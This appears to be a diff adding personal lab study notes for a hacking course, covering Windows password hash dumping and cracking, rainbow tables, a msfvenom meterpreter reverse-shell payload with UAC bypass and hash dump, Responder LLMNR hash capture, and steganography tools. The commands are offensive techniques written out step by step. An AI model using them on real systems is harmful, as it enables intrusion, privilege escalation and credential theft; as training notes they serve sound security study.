@@ -1,0 +1,75 @@
+https://www.youtube.com/watch?v=m_EyLhcoDIE&ab_channel=OffensiveHacks
+
+* Dumping and cracking SAM hashes:
+    - Command to display user account names and their Ids 
+        > wmic useraccount get name,sid
+    - Run the pnwdump command to get the password hashes of the users:
+        > ./pwndump7.exe
+        > save the result into a txt file (./pwndump7.exe > hashes.txt)
+    - Open the ophcrack to crack the hashes:
+    - Click on load and select PWNDUMP file.
+    - Click on "Tables" from menu bar and select Vista free
+    - For installation choose the folder where ophcrack is present.
+    - Click on Crack from menu bar , this will start cracking passwords.
+
+* Creating and using Rainbow tables:
+    - To create table open winrtgen tool.
+    - Click on add table > select ntlm from hash drop down > set min len 4 and max 6 > Chain count 4000000
+    - Select loweraplha from charset dropdown
+    - Click OK, this will create the Rainbow hash table
+
+* Cracking the hash with rainbow attack
+    - Go to rainbow crack and open rcrack_gui.exe to launch rainbow attack
+    - When window appears click on File > Load NTLM Hashes from PWNDUMP file
+    - Now to use the already generated rainbow table click Rainbow table > Search Rainbow tables > ntlm_loweralpha......4000000...rt
+    - This will crach the hashes.
+
+* Auditing system password using L0phtCrack:
+
+* Exploiting Client side vulns and establishing VNC Session:
+    - Create a malicious windows payload
+        # msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<ownip> LPORT=<own port> -o output payload_file_name.exe
+    - Elevate privileges with metasploit:
+        # getsystem -t 1
+        to backgroung meterpreter session type "background"
+        # use exploit/windows/local/bypassuac_fodhelper
+        # show options
+        # session -i 1
+        # set payload windows/meterpreter/reverse_tcp
+        # set lhost <own ip>
+        # set Target 0
+        # exploit
+    - To dump hashes, type below command
+        # run post/windows/gather/smart_hashdump
+
+* Hiding data using steganography:
+    - Go to steganography tools and open terminal.
+    - Tyep below command 
+        > snow -C -m "This is a simple text" -p "password@123" file1.txt file2.txt 
+        file2.txt is the new file that will be created which will have text from file1 and it will have the secret text hidden in form of white spaces.
+
+* Image steganography using Openstego:
+    - Open Openstego tool and select the text file from "Message file" option.
+    - Select image from "Cover file" option 
+    - Select location and give any name for output file.
+    - Click on hide data
+Another tool that can be used to perform this tsk is "QuickStego"
+
+* Viewing, Enabling & Clearing Audit policies using Auditpol:
+    - Run below command to get all the windows policies:
+     > auditpol /get /category:* 
+     This will list out all the windows policy   
+    - To enable the policy type below command:
+     > auditpol /set /category:"system","account logon" /success:enable /failure:enable
+
+* Converting channels using Convert_TCP:
+
+* Responder:
+    # responder -l eth0
+    This will dump the log file (/usr/share/responder/logs) with the hash of user trying to do th LLMNR query
+
+* Crack the password via john:
+    # john usr/share/responder/logs/<log_file_name>.txt 
+
+
+
